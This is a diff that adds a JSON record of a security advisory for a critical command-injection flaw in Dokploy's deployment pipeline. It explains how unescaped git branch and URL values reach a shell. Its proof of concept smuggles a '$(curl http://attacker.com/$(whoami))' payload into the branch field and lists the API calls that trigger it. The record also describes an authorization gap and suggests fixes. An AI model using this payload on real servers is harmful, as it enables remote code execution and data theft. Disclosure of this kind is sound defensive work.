@@ -1,0 +1,44 @@
+{
+  "global": null,
+  "id": "GHSA-qxcw-cx35-2hrw",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "## Summary\n\nThe `saveGitProvider` tRPC mutation accepts user-controlled `customGitBranch` and `customGitUrl` values with **zero sanitization** (only `z.string()` validation). These values are directly interpolated into shell commands via template literals and executed via `child_process.exec()` during deployment, allowing any authenticated user to achieve **Remote Code Execution** on the Dokploy server.\n\n## Vulnerability Details\n\n### Sink: Shell Command Construction\n\n**File:** `packages/server/src/utils/providers/git.ts`, line 79\n\n```typescript\ncommand += `if ! git clone --branch ${customGitBranch} --depth 1 ${enableSubmodules ? \"--recurse-submodules\" : \"\"} --progress ${customGitUrl} ${outputPath}; then\n    echo \"❌ [ERROR] Fail to clone the repository ${customGitUrl}\";\n    exit 1;\nfi`;\n```\n\nBoth `customGitBranch` and `customGitUrl` are interpolated directly into a shell command string with no escaping.\n\n### Source: User Input via tRPC API\n\n**File:** `apps/dokploy/server/api/routers/application.ts`, lines 547-572\n\nThe `saveGitProvider` mutation accepts user input:\n\n```typescript\n.input(apiSaveGitProvider)  // Zod schema with z.string() only\n```\n\n**File:** `packages/server/src/db/schema/application.ts`, lines 495-509\n\n```typescript\nexport const apiSaveGitProvider = z.object({\n    // ...\n    customGitBranch: z.string().optional(),  // No regex, no pattern, no sanitization\n    customGitUrl: z.string().optional(),      // No regex, no pattern, no sanitization\n    // ...\n});\n```\n\n### Execution Path\n\n**File:** `packages/server/src/services/application.ts`, lines 199-212\n\n```typescript\nconst command = await cloneGitRepository(applicationEntity);\n// ...\nconst commandWithLog = `(${command}) >> ${deployment.logPath} 2>&1`;\nif (serverId) {\n    await execAsyncRemote(serverId, commandWithLog);  // Executes via SSH on remote server\n} else {\n    await execAsync(commandWithLog);  // Executes via child_process.exec() locally\n}\n```\n\n`execAsync` is `util.promisify(exec)` from `child_process`, which spawns a shell.\n\n## Additional Injection Vectors\n\n1. **Line 62:** `command += \\`echo \"Cloning Repo Custom ${customGitUrl} to ${outputPath}\"\\`` - `customGitUrl` containing `$(cmd)` or backticks would execute within double quotes\n2. **Line 58:** `addHostToKnownHostsCommand(customGitUrl)` - domain extracted from URL is interpolated into `ssh-keyscan -p ${port} ${domain}` without escaping\n\n## Authorization Weakness\n\nThe `saveGitProvider` mutation only checks organization membership - there is **no `checkServiceAccess` call** for \"member\" role users. Compare with `create` and `delete` which do check member permissions. This means any authenticated user in the organization (including restricted members) can set malicious git settings.\n\n## Proof of Concept\n\n**Step 1:** Save malicious git provider settings:\n```bash\n# Via tRPC API - saveGitProvider mutation\nPOST /api/trpc/application.saveGitProvider\n{\n    \"applicationId\": \"<existing_app_id>\",\n    \"customGitBranch\": \"main$(curl http://attacker.com/$(whoami))\",\n    \"customGitUrl\": \"https://github.com/user/repo\",\n    \"customGitOwner\": \"user\"\n}\n```\n\n**Step 2:** Trigger deployment:\n```bash\nPOST /api/trpc/application.deploy\n{\"applicationId\": \"<same_app_id>\"}\n```\n\n**Step 3:** The following shell command is constructed and executed:\n```bash\ngit clone --branch main$(curl http://attacker.com/$(whoami)) --depth 1 --progress https://github.com/user/repo /path/to/output\n```\n\nThe `$(curl ...)` payload executes, sending the server's username to the attacker's server.\n\n## Impact\n\n- **Remote Code Execution** with the privileges of the Dokploy server process (typically root in Docker-based deployments)\n- **Full server compromise** - read/write any file, access all containers, steal credentials\n- **Lateral movement** - if using remote servers via SSH (`execAsyncRemote`), commands also execute on those servers\n- Any authenticated user (including restricted \"member\" role) can exploit this\n\n## Suggested Fix\n\n1. **Validate inputs** with strict regex:\n```typescript\ncustomGitBranch: z.string().regex(/^[a-zA-Z0-9._\\-\\/]+$/).optional(),\ncustomGitUrl: z.string().url().optional(),\n```\n\n2. **Use `execFile` with arguments array** instead of `exec` with string interpolation:\n```typescript\nimport { execFile } from 'child_process';\nexecFile('git', ['clone', '--branch', customGitBranch, '--depth', '1', customGitUrl, outputPath]);\n```\n\n3. **Apply shell escaping** as a defense-in-depth measure for any remaining string interpolation.",
+    "ghsa_id": "GHSA-qxcw-cx35-2hrw",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-qxcw-cx35-2hrw",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-qxcw-cx35-2hrw"
+      }
+    ],
+    "published_at": "2026-07-21T23:26:21Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "OS Command Injection via customGitBranch/customGitUrl in Deployment Pipeline",
+    "updated_at": "2026-07-21T23:26:21Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": null,
+        "vulnerable_version_range": "<= 2.5.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
